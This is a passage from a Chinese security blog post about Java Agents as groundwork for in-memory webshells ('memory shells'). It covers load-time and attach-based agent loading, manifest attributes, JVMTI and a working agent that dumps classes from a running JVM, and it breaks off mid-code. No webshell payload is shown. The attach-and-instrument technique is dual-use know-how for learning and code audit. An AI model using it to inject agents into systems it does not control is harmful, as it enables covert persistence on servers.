<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>从Java Agent到内存马 | 少年锦时</title><meta name="author" content="s8ark"><meta name="copyright" content="s8ark"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本文首发于FreeBuf  https://www.freebuf.com/articles/web/367614.html  一、初识Java Agent参考：https://lsieun.github.io/java-agent/s01ch01/java-agent-overview.html 在 Java Agent 当中，核心的作用是进行 bytecode instrumentatio"><meta property="og:type" content="article"><meta property="og:title" content="从Java Agent到内存马"><meta property="og:url" content="https://blog.s8ark.top/2023/05/26/%E4%BB%8EJava%20Agent%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC/index.html"><meta property="og:site_name" content="少年锦时"><meta property="og:description" content="本文首发于FreeBuf  https://www.freebuf.com/articles/web/367614.html  一、初识Java Agent参考：https://lsieun.github.io/java-agent/s01ch01/java-agent-overview.html 在 Java Agent 当中，核心的作用是进行 bytecode instrumentatio"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://s11.ax1x.com/2024/02/03/pFQ4yo8.jpg"><meta property="article:published_time" content="2023-05-26T14:15:26.000Z"><meta property="article:modified_time" content="2024-02-03T01:57:00.384Z"><meta property="article:author" content="s8ark"><meta property="article:tag" content="java安全"><meta property="article:tag" content="代码审计"><meta property="article:tag" content="内存马"><meta property="article:tag" content="Java Agent"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://s11.ax1x.com/2024/02/03/pFQ4yo8.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://blog.s8ark.top/2023/05/26/%E4%BB%8EJava%20Agent%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media=&quot;all&quot;"><link rel="stylesheet" href="https://unpkg.com/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media=&quot;all&quot;"><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?aaf3e014fbcd61fc9b3e7614f72ed895";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://unpkg.com/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://unpkg.com/flickr-justified-gallery/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"从Java Agent到内存马",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2024-02-03 09:57:00"}</script><noscript><style type="text/css">#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/top-header.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.jpg" onerror="onerror=null,src=&quot;/img/friend_404.gif&quot;" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(https://s11.ax1x.com/2024/02/03/pFQ4yo8.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">少年锦时</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">从Java Agent到内存马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-26T14:15:26.000Z" title="发表于 2023-05-26 22:15:26">2023-05-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-03T01:57:00.384Z" title="更新于 2024-02-03 09:57:00">2024-02-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="从Java Agent到内存马"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url(https://s11.ax1x.com/2024/02/03/pFQ4yo8.jpg);"></div><article class="post-content" id="article-container"><blockquote><p>本文首发于FreeBuf <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/367614.html">https://www.freebuf.com/articles/web/367614.html</a></p></blockquote><h1 id="一、初识Java-Agent"><a href="#一、初识Java-Agent" class="headerlink" title="一、初识Java Agent"></a>一、初识Java Agent</h1><p>参考：<a target="_blank" rel="noopener" href="https://lsieun.github.io/java-agent/s01ch01/java-agent-overview.html">https://lsieun.github.io/java-agent/s01ch01/java-agent-overview.html</a></p><p>在 <span class="colour" style="color:red">Java Agent </span>当中，核心的作用是进行 <span class="colour" style="color:red">bytecode instrumentation(字节码插桩)</span></p><h2 id="1-Java-Agent启动方式"><a href="#1-Java-Agent启动方式" class="headerlink" title="1.Java Agent启动方式"></a>1.Java Agent启动方式</h2><p>对于.class文件修改(插桩)有<strong>三种不同的时机</strong>：<br>![image-20230515205703449.png](从Java Agent到内存马.assets/1685066853_64701465ec31f24320a10.png!small)<br>图片引用自：<a target="_blank" rel="noopener" href="https://lsieun.github.io/java-agent/s01ch01/java-agent-overview.html">https://lsieun.github.io/java-agent/s01ch01/java-agent-overview.html</a><br>Java Agent只关注正在加载和加载后的情况</p><p>对应这两种时机，有两种<strong>启动Java Agent的方式</strong>：</p><ul><li>命令行（<strong>Command Line</strong>）启动 &lt;= Load-Time Instrumentation</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ./target/classes/ -javaagent:./target/TheAgent.jar sample.Program</span><br></pre></td></tr></tbody></table></figure><ul><li>通过虚拟机提供的 <strong>Attach</strong>机制来启动 &lt;= Dynamic Instrumentation</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.tools.attach.VirtualMachine;</span><br><span class="line"></span><br><span class="line">public class VMAttach {</span><br><span class="line">    public static void main(String[] args) throws Exception {</span><br><span class="line">        String pid = "1234";</span><br><span class="line">        String agentPath = "D:\\git-repo\\learn-java-agent\\target\\TheAgent.jar";</span><br><span class="line">        VirtualMachine vm = VirtualMachine.attach(pid);</span><br><span class="line">        vm.loadAgent(agentPath);</span><br><span class="line">        vm.detach();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="2-了解Agent-Jar"><a href="#2-了解Agent-Jar" class="headerlink" title="2.了解Agent Jar"></a>2.了解Agent Jar</h2><p>参考：<a target="_blank" rel="noopener" href="https://lsieun.github.io/java-agent/s01ch01/agent-jar-three-core-components.html">https://lsieun.github.io/java-agent/s01ch01/agent-jar-three-core-components.html</a><br>![image-20230515213920913.png](从Java Agent到内存马.assets/1685066919_647014a74f7832164cff1.png!small)<br>manifest文件中的属性会在agent启动时被加载，我这里介绍常用的属性(与 Java Agent 相关的属性有6、7个)：</p><ul><li><strong>Premain-Class</strong>: 在JVM启动时指定代理时，此属性指定代理类。也就是说，包含premain方法的类。当在JVM启动时指定代理时，此属性是必需的。如果该属性不存在，JVM将中止。注意：这是一个类名，而不是一个文件名或路径。</li><li><strong>Agent-Class</strong>: 如果实现支持在VM启动后某个时间启动代理的机制，则此属性指定代理类。也就是说，包含agentmain方法的类。这个属性是必需的，如果没有它，代理将不会启动。注意:这是一个类名，而不是文件名或路径。</li><li><strong>Can-Redefine-Classes</strong>: 布尔值(true或false，与大小写无关)。是重新定义此代理所需的类的能力。除true以外的值被认为是false。该属性是可选的，默认为false。</li><li><strong>Can-Retransform-Classes</strong>: 布尔值(真或假，与大小写无关)。是重新转换此代理所需的类的能力。除true以外的值被认为是false。该属性是可选的，默认为false。</li><li><strong>Can-Set-Native-Method-Prefix</strong>: 布尔值（真或假，大小写无关）。是设置此代理所需的本地方法前缀的能力。真以外的值被认为是假的。此属性是可选的，默认值为false。</li></ul><h2 id="3-Java-Agent-的实现原理"><a href="#3-Java-Agent-的实现原理" class="headerlink" title="3.Java Agent 的实现原理"></a>3.Java Agent 的实现原理</h2><p>JVM 在类加载时触发 JVMTI_EVENT_CLASS_FILE_LOAD_HOOK 事件调用添加的字节码转换器完成字节码转换</p><p><strong>JVMTI</strong>（JVM Tool Interface）是 JVM 暴露出来给用户扩展使用的接口集合，JVMTI 是基于事件驱动的，JVM每执行一定的逻辑就会调用一些事件的回调接口，这些接口可以给用户自行扩展来实现自己的逻辑。</p><p>参考<a target="_blank" rel="noopener" href="https://luckymrwang.github.io/images/java-agent1.jpghttps://luckymrwang.github.io/2020/12/28/%E7%A0%B4%E8%A7%A3-Java-Agent-%E6%8E%A2%E9%92%88%E9%BB%91%E7%A7%91%E6%8A%80/#JVMTIAgent">时序图</a><br>![image-20230517184657689.png](从Java Agent到内存马.assets/1685066967_647014d71e4aa885a0adc.png!small)</p><h1 id="二、使用Agent-dump-JVM中的Class"><a href="#二、使用Agent-dump-JVM中的Class" class="headerlink" title="二、使用Agent dump JVM中的Class"></a>二、使用Agent dump JVM中的Class</h1><p>参考：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1R34y1b7U7?p=2&amp;vd_source=08ec27c446c7fe3ce7235d101b3cbf17">Java Agent通灵之术</a></p><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>注意：以下代码均使用JDK1.8</p><p>创建目录结构</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">JAgentTest</span><br><span class="line"> ├── application</span><br><span class="line"> │   ├── out</span><br><span class="line"> │   │   └── sample</span><br><span class="line"> │   └── src</span><br><span class="line"> │       └── sample</span><br><span class="line"> │           ├── HelloWorld.java</span><br><span class="line"> │           └── Program.java</span><br><span class="line"> ├── java-agent</span><br><span class="line"> │   ├── out</span><br><span class="line"> │   └── src</span><br><span class="line"> │       ├── ClassDumpAgent.java</span><br><span class="line"> │       ├── ClassDumpTransformer.java</span><br><span class="line"> │       ├── ClassDumpUtils.java</span><br><span class="line"> │       └── manifest.txt</span><br><span class="line"> └── tools-attach</span><br><span class="line">     ├── out</span><br><span class="line">     └── src</span><br><span class="line">         └── Attach.java</span><br></pre></td></tr></tbody></table></figure><h2 id="2-编写一个application"><a href="#2-编写一个application" class="headerlink" title="2.编写一个application"></a>2.编写一个application</h2><p><strong>HelloWorld.java</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package sample;</span><br><span class="line"></span><br><span class="line">public class HelloWorld {</span><br><span class="line">	public static int add(int a, int b) {</span><br><span class="line">		return a+b;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	public static int sub(int a, int b) {</span><br><span class="line">		return a-b;</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>Program.java</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package sample;</span><br><span class="line"></span><br><span class="line">import java.lang.management.ManagementFactory;</span><br><span class="line">import java.util.Random;</span><br><span class="line">import java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Program {</span><br><span class="line">	public static void main(String[] args) throws Exception {</span><br><span class="line">		String nameOfRunningVM = ManagementFactory.getRuntimeMXBean().getName();</span><br><span class="line">		System.out.println(nameOfRunningVM);</span><br><span class="line"></span><br><span class="line">		int count = 600;</span><br><span class="line">		for (int i = 0; i &lt; count ; i++ ){</span><br><span class="line">			String info = String.format("|%03d| %s remains %03d seconds", i, nameOfRunningVM, (count-i));</span><br><span class="line">			System.out.println(info);</span><br><span class="line"></span><br><span class="line">			Random rand = new Random(System.currentTimeMillis());</span><br><span class="line">			int a = rand.nextInt(10);</span><br><span class="line">			int b = rand.nextInt(10);</span><br><span class="line">			boolean flag = rand.nextBoolean();</span><br><span class="line">			String message;</span><br><span class="line">			if(flag){</span><br><span class="line">				message = String.format("a + b = %d",HelloWorld.add(a,b));</span><br><span class="line">			}else{</span><br><span class="line">				message = String.format("a - b = %d",HelloWorld.sub(a,b));</span><br><span class="line">			}</span><br><span class="line">			System.out.println(message);</span><br><span class="line"></span><br><span class="line">			TimeUnit.SECONDS.sleep(1);</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>PowerShell编译运行</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac .\src\sample\*.java -d .\out\</span><br><span class="line">cd out</span><br><span class="line">java sample.Program</span><br></pre></td></tr></tbody></table></figure><h2 id="3-编写Agent"><a href="#3-编写Agent" class="headerlink" title="3.编写Agent"></a>3.编写Agent</h2><p><strong>ClassDumpAgent.java</strong></p><p><strong>premain()</strong>: 在主程序运行之前的代理程序使用premain()。(Load-Time Instrumentation)</p><ul><li>agentArgs是函数得到的程序参数，随同”-javaagent”一起传入，传入的是一个字符串</li><li>Inst是一个java.lang.instrument.Instrumentation的实例，由JVM自动传入</li></ul><p>**agentmain():**在主程序运行之后的代理程序使用agentmain()。(Dynamic Instrumentation)</p><p>**addTransformer()：**注册一个Class文件的转换器，该转换器用于改变class二进制流的数据。</p><p>**retransformClasses()：**对传入的类(已加载)进行转换</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.instrument.Instrumentation;</span><br><span class="line">import java.lang.instrument.UnmodifiableClassException;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * This is a java.lang.instrument agent to dump .class files</span><br><span class="line"> * from a running Java application.</span><br><span class="line"> */</span><br><span class="line">public class ClassDumpAgent {</span><br><span class="line">	public static void premain(String agentArgs, Instrumentation inst) {</span><br><span class="line">        agentmain(agentArgs, inst);</span><br><span class="line">    }</span><br><span class="line">	public static void agentmain(String agentArgs, Instrumentation inst) {</span><br><span class="line">		System.out.println("agentArgs: " + agentArgs);</span><br><span class="line">		ClassDumpUtils.parseArgs(agentArgs);</span><br><span class="line">		inst.addTransformer(new ClassDumpTransformer(), true);</span><br><span class="line">		// by the time we are attached, the classes to be</span><br><span class="line">        // dumped may have been loaded already.</span><br><span class="line">        // So, check for candidates in the loaded classes.</span><br><span class="line">		Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line">		List&lt;Class&gt; candidates = new ArrayList&lt;&gt;();</span><br><span class="line">		for (Class c : classes) {</span><br><span class="line">            String className = c.getName();</span><br><span class="line"></span><br><span class="line">            // 第一步，排除法：不考虑JDK自带的类</span><br><span class="line">            if (className.startsWith("java")) continue;</span><br><span class="line">            if (className.startsWith("javax")) continue;</span><br><span class="line">            if (className.startsWith("jdk")) continue;</span><br><span class="line">            if (className.startsWith("sun")) continue;</span><br><span class="line">            if (className.startsWith("com.sun")) continue;</span><br><span class="line"></span><br><span class="line">            // 第二步，筛选法：只留下感兴趣的类（正则表达式匹配）</span><br><span class="line">            boolean isModifiable = inst.isModifiableClass(c);</span><br><span class="line">            boolean isCandidate = ClassDumpUtils.isCandidate(className);</span><br><span class="line">            if (isModifiable &amp;&amp; isCandidate) {</span><br><span class="line">                candidates.add(c);</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            // 不重要：打印调试信息</span><br><span class="line">            String message = String.format("[DEBUG] Loaded Class: %s ---&gt; Modifiable: %s, Candidate: %s", className, isModifiable, isCandidate);</span><br><span class="line">            System.out.println(message);</span><br><span class="line">        }</span><br><span class="line">        try {</span><br><span class="line">            // 第三步，将具体的class进行dump操作</span><br><span class="line">            // if we have matching candidates, then retransform those classes</span><br><span class="line">            // so that we will get callback to transform.</span><br><span class="line">            if (!candidates.isEmpty()) {</span><br><span class="line">                inst.retransformClasses(candidates.toArray(new Class[0]));</span><br><span class="line"></span><br><span class="line">                // 不重要：打印调试信息</span><br><span class="line">                String message = String.format("[DEBUG] candidates size: %d", candidates.size());</span><br><span class="line">                System.out.println(message);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        catch (UnmodifiableClassException ignored) {</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>ClassDumpTransformer.java</strong></p><ul><li><b><code>transform()</code></b>方法会在 JVM 加载类文件时被调用。具体来说，当 JVM 加载一个类时，它会先将类文件的<strong>字节码读入内存</strong>，然后将字节码<strong>传递给已注册的类转换器</strong>（即实现了<code>ClassFileTransformer</code>接口的类），让转换器对其进行修改。(Load-Time Instrumentation)</li><li>调用<code>Instrumentation</code>接口的 <b><code>retransformClasses</code></b>方法时会触发已注册的类转换器的 <b><code>transform()</code></b>方法。具体来说，当<code>retransformClasses</code>方法被调用时，JVM 会将指定的类<strong>重新加载</strong>，并将其字节码<strong>传递给已注册的类转换器</strong>进行转换。(Dynamic Instrumentation)</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.instrument.ClassFileTransformer;</span><br><span class="line">import java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line">public class ClassDumpTransformer implements ClassFileTransformer {</span><br><span class="line"></span><br><span class="line">    public byte[] transform(ClassLoader loader,</span><br><span class="line">                            String className,</span><br><span class="line">                            Class redefinedClass,</span><br><span class="line">                            ProtectionDomain protDomain,</span><br><span class="line">                            byte[] classBytes) {</span><br><span class="line">        // check and dump .class file</span><br><span class="line">        if (ClassDumpUtils.isCandidate(className)) {</span><br><span class="line">            ClassDumpUtils.dumpClass(className, classBytes);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        // we don't mess with .class file, just return null</span><br><span class="line">        return null;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>ClassDumpUtils.java</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line">public class ClassDumpUtils {</span><br><span class="line">    // directory where we would write .class files</span><br><span class="line">    private static String dumpDir;</span><br><span class="line">    // classes with name matching this pattern will be dumped</span><br><span class="line">    private static Pattern classes;</span><br><span class="line"></span><br><span class="line">    // parse agent args of the form arg1=value1,arg2=value2</span><br><span class="line">    public static void parseArgs(String agentArgs) {</span><br><span class="line">        if (agentArgs != null) {</span><br><span class="line">            String[] args = agentArgs.split(",");</span><br><span class="line">            for (String arg : args) {</span><br><span class="line">                String[] tmp = arg.split("=");</span><br><span class="line">                if (tmp.length == 2) {</span><br><span class="line">                    String name = tmp[0];</span><br><span class="line">                    String value = tmp[1];</span><br><span class="line">                    if (name.equals("dumpDir")) {</span><br><span class="line">                        dumpDir = value;</span><br><span class="line">                    }</span><br><span class="line">                    else if (name.equals("classes")) {</span><br><span class="line">                        classes = Pattern.compile(value);</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        if 